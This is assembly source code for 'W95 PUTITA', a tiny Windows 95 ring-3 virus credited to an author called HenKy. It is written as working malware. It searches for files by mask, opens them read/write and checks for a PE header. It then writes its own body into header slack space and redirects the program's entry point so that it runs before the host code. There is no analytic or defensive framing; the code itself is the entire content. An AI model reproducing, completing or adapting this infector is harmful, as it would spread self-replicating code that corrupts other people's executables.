   ;----------------------------  W95 PUTITA BY HenKy -----------------------------
   ;
   ;-AUTHOR:        HenKy
   ;
   ;-MAIL:          HenKy_@latinmail.com
   ;
   ;-ORIGIN:        SPAIN
   ;


    ; BAH.... ONLY 183 BYTES.... SMALL RING 3 VIRUS

   .386P
   .MODEL FLAT
   LOCALS

   EXTRN    ExitProcess:PROC
   MIX_SIZ  EQU  (FILE_END - MEGAMIX)

   .DATA
           DB '0

   .CODE

   MEGAMIX:


           VINT21:
           DD 0BFF712B9h   ; MOV ECX,0C3B912F7H  ;-) Z0MBiE
   RETOX:  RET
           XCHG EDI, EAX   ; EDI: DELTA
           MOV  ESI,0C1000000H  ; ESI: BUFFER
           MOV  EBP,EDI    ; NOW: EBP=EDI=DELTA=INT21H

           MOV AH, 2FH
           CALL [EDI]

           PUSH ES
           PUSH EBX

           PUSH DS
           POP ES

           MOV AH, 1Ah
           LEA EDX, [ESI.DTA]
           CALL [EDI]
           MOV AH, 4Eh
           XOR ECX,ECX
           LEA EDX, [EDI+IMASK-MEGAMIX]
   FF_:
           CALL [EDI]
           JC OK
           MOV AX, 3D02h
           LEA EDX, [ESI.DTA+1Eh]
           CALL [EDI]

           XCHG EBX, EAX
           PUSHAD
           CALL PHECT
           POPAD
           MOV AH, 3Eh
           CALL [EDI]

           MOV AH, 4Fh
           JMP FF_
   OK:
           POP EDX
           POP DS
           MOV AH, 1Ah
           CALL [EDI]

           PUSH ES
           POP DS

           PUSH 00401000H
           OLD_EIP EQU $-4
           PUSH EDI
    WARNING:POP EDI
            RET

   PHECT:
           PUSH EDI
           XOR ECX,ECX
           MOV EDX, ESI
           PUSH ESI
           MOV AH, 3Fh
           CALL R_W

           MOV ECX, [ESI+3Ch]
           LEA EAX, [ESI+ECX]

           CMP BYTE PTR [EAX], "P"
           JNE WARNING
           CMP DWORD PTR [EAX+28h], 1024
           JB WARNING

           MOV ECX,[EAX+28H]
           ADD ECX,[EAX+34H]
           MOV [EBP+OLD_EIP-MEGAMIX],ECX
           MOV EDI,EAX

   PORRO:
           INC EDI
           CMP BYTE PTR [EDI],'B' ; hehehehe
           JNE PORRO
           INC EDI
           POP ECX
           SUB EDI,ECX
           MOV EDX,EDI
           XCHG DWORD PTR [EAX+28h], EDI
           LEA EDI, [ESI+EDX]
           PUSH MIX_SIZ/4
           POP ECX
           POP EAX
           PUSH EAX
           XCHG ESI, EAX
           REP MOVSD
           POP EDI
           MOV EDX, EAX
   W:
           MOV AH, 40h
   R_W:

           PUSHAD
           XOR EAX,EAX
           MOV AH, 42h
           CDQ
           CALL [EDI]
           POPAD
           MOV CH, 4h
           CALL [EDI]
           RET

   IMASK        DB "*.ZZZ", 0
   ALIGN 4
   FILE_END:


   SF              STRUC
                   DB 1024 DUP(?)
   DTA             DB 43 DUP(?)
   SF              ENDS


           PUSH 0
           CALL ExitProcess

   END MEGAMIX
